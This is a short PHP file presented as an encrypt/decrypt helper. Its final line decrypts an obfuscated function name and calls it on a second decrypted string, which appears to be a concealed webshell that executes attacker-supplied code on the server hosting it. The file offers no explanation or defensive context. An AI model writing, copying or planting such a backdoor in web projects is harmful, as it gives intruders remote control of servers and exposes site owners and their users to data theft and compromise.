<?PHP

function encrypt($data, $key)
{
 $key = md5($key);
    $x  = 0;
    $len = strlen($data);
    $l  = strlen($key);
    for ($i = 0; $i < $len; $i++)
    {
        if ($x == $l)
        {
         $x = 0;
        }
        $char .= $key{$x};
        $x++;
    }
    for ($i = 0; $i < $len; $i++)
    {
        $str .= chr(ord($data{$i}) + (ord($char{$i})) % 256);
    }
   return base64_encode($str);
   #return $str;
}



function decrypt($data, $key)
{
 $key = md5($key);
    $x = 0;
    $data = base64_decode($data);
    $len = strlen($data);
    $l = strlen($key);
    for ($i = 0; $i < $len; $i++)
    {
        if ($x == $l) 
        {
         $x = 0;
        }
        $char .= substr($key, $x, 1);
        $x++;
    }
    for ($i = 0; $i < $len; $i++)
    {
        if (ord(substr($data, $i, 1)) < ord(substr($char, $i, 1)))
        {
            $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));
        }
        else
        {
            $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
        }
    }
    return $str;
}





(@$_=decrypt("xKXZyqet","520025")).@$_(decrypt("l6aW0YvIlpulsdSoX1yWhoKDiL1ck42WX4xilZRlZ29ZWV4=","06789"));


?>
